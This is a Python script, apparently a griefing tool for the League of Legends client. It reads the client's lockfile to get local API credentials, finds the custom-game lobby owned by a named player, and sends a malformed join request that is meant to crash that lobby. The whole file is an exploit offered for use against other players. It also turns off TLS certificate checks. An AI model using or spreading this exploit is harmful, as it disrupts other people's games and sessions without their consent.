from os import path
from requests import Session
from urllib3 import disable_warnings, exceptions
from urllib.parse import urljoin
from json import dumps


class Crasher:
    def __init__(self, league: str):
        with open(path.join(league, 'lockfile'), 'r', encoding='UTF-8') as lockfile:
            port, self.__password, protocol = lockfile.read().split(':')[2:]
        self.base_url = f'{protocol}://127.0.0.1:{port}/'
        self.__session = Session()
        self.__session.auth = ('riot', self.__password)
        self.__session.verify = False
        disable_warnings(exceptions.InsecureRequestWarning)

        self.summoner = self.request('get', '/lol-summoner/v1/current-summoner').json()

        self.target_lobby_id = None
    
    def request(self, method, endpoint, data=None):
        return self.__session.request(method, urljoin(self.base_url, endpoint), data=dumps(data))

    def crash(self):
        if (self.target_lobby_id):
            print(f"Escaping current lobby.")
            body = { "parameters": None }
            print(self.request("post", f"/lol-lobby/v1/custom-games/{self.target_lobby_id}/join", data=body))

            self.target_lobby_id = None
        else:
            print("No target lobby provided.")
    
    def set_lobby(self, player_name: str):
        self.request("post", "/lol-lobby/v1/custom-games/refresh")
        custom_games = self.request("get", "/lol-lobby/v1/custom-games").json()

        for game in custom_games:
            owner = game["ownerDisplayName"].split(' ')
            if (owner[0] == player_name):
                self.target_lobby_id = game["id"]
                break
        
        if (self.target_lobby_id):
            print(f"Found lobby of {player_name}: {game['id']}.\n")
        else:
            print(f"Failed retrieving lobby for {player_name}.\n")
